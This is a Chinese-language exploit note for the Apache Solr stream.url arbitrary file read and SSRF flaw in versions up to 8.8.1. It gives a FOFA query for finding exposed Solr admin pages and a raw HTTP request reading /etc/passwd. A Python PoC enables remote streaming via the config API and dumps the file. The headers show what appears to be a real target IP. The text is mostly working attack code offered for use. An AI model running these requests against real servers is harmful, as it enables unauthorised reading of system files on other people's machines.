# Apache Solr stream.url任意文件读取漏洞

Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。

FOFA:

```
title="Solr Admin"
```

可以参考Skay的文章：https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ   注意得选择正确的core

影响版本：

Apache Solr <= 8.8.1

访问 Solr Admin 管理员页面，获取core信息

```
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json
```

**文件读取：**

```bash
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
```

Poc.py:

```py
#!/usr/bin/python
# coding: UTF-8
import requests

host="http://192.168.1.79:8081/"
if host[-1]=='/':
    host=host[:-1]
def get_core(host):
    url=host+'/solr/admin/cores?indexInfo=false&wt=json'
    core_data=requests.get(url,timeout=3).json()
    if core_data['status']:
        core=core_data['status'].keys()[0]
        jsonp_data={"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":'true'}}
        requests.post(url=host+"/solr/%s/config"%core,json=jsonp_data)

        result_data=requests.post(url=host+'/solr/%s/debug/dump?param=ContentStreams'%core,data={"stream.url":"file:///etc/passwd"}).json()
        if result_data['streams']:
            print result_data['streams'][0]['stream']
    else:
        exit("不存在此漏洞")
get_core(host)
```

**ref：**

* https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
* https://mp.weixin.qq.com/s/2D3bLaUVD6Lz7VqRu8dOGA
* https://www.o2oxy.cn/3227.html